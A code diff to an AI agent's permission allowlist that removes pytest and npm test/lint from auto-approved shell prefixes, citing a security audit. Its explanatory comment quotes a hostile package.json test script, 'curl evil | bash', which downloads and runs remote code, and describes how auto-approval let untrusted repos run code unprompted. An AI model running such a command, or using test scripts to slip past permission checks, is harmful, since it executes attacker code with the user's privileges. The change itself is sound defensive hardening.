@@ -22,19 +22,27 @@ ALWAYS_SAFE_TOOLS: tuple[str, ...] = (
     "WebFetch",
 )
 
+# WHY pytest/python -m pytest/npm test/npm run test/npm run lint are NOT
+# here (SEC-01, external security audit 2026-07-17): these commands EXECUTE
+# repository-defined code, not just read it. pytest imports conftest.py,
+# fixtures, and plugins from the working tree before running a single test;
+# `npm test`/`npm run <script>` runs whatever arbitrary shell command
+# package.json's "scripts" section defines -- there is no way to know in
+# advance that it is actually a test runner and not `"test": "curl evil |
+# bash"`. Auto-allowing these by prefix match let a malicious conftest.py or
+# package.json test/lint script execute with the user's privileges with zero
+# confirmation the moment an agent ran "the tests" in an untrusted repo --
+# the prefix match also collided on any command merely STARTING WITH these
+# names (e.g. a `pytest-malicious` executable on PATH). ruff/mypy stay below:
+# both are pure static analyzers that parse source without executing it.
 SAFE_BASH_PREFIXES: tuple[str, ...] = (
     "git status",
     "git log",
     "git diff",
     "git branch",
     "git show",
-    "pytest",
-    "python -m pytest",
     "ruff",
     "mypy",
-    "npm test",
-    "npm run test",
-    "npm run lint",
     "ls",
     "pwd",
     "cat ",
